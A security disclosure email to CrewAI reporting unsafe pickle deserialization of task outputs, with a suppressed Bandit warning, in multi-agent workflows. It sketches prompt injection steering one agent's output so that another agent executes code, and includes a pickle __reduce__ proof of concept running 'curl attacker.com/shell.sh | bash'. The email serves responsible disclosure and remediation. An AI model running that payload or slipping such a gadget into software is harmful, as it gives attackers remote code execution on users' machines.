# Disclosure Email — CrewAI (crewAIInc)

**To:** security@crewai.com (or via GitHub Security Advisory on crewAIInc/crewAI)
**Subject:** Security Report: Unsafe pickle deserialization in CrewAI task output handling

---

Hi CrewAI Security Team,

I'm writing to report a security finding in CrewAI identified during an automated review using lore-review (https://github.com/Miles0sage/lore-review), an open-source security tool focused on AI agent codebases.

**Finding: Unsafe `pickle.load()` with suppressed Bandit warning**

- **Severity:** High
- **Location:** Task output deserialization code -- `pickle.load()` call annotated with `# noqa: S301` to suppress Bandit's B301 (deserialization of untrusted data) warning
- **Description:** CrewAI uses `pickle.load()` to deserialize task outputs. The Bandit security linter flags this as S301 (deserialization of untrusted data), but the warning has been explicitly suppressed with a `# noqa: S301` comment. Pickle deserialization of untrusted data is a well-documented remote code execution vector.
- **Attack scenario:** In a multi-agent workflow, Agent A produces a task output that gets serialized. If an attacker can influence Agent A's output (via prompt injection, compromised tool, or malicious API response), they can craft a pickle payload that executes arbitrary code when Agent B deserializes it. A minimal exploit:

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

malicious_data = pickle.dumps(Exploit())
```

In an agentic context, this is particularly dangerous because the serialized data is produced by LLM-directed tool execution, which is inherently untrusted.

- **Recommended fix:** Replace `pickle` with a safe serialization format:
  1. **JSON** (`json.dumps`/`json.loads`) -- safest, works for most task output structures
  2. **Pydantic serialization** (`model.model_dump_json()` / `Model.model_validate_json()`)
  3. If pickle is required, use `hmac`-signed pickle with a server-side secret to verify integrity before deserializing

  Additionally, remove the `# noqa: S301` suppression so future reintroduction of unsafe deserialization is caught by CI.

**Disclosure timeline:**

- **April 11, 2026:** This report sent to maintainers
- **July 10, 2026 (90 days):** Public disclosure

I'm happy to provide additional technical details, proof-of-concept code, or discuss remediation strategies.

These findings were identified by lore-review (https://github.com/Miles0sage/lore-review), an open-source AI code security tool designed for agent codebases.

Best regards,
Miles
https://github.com/Miles0sage/lore-review
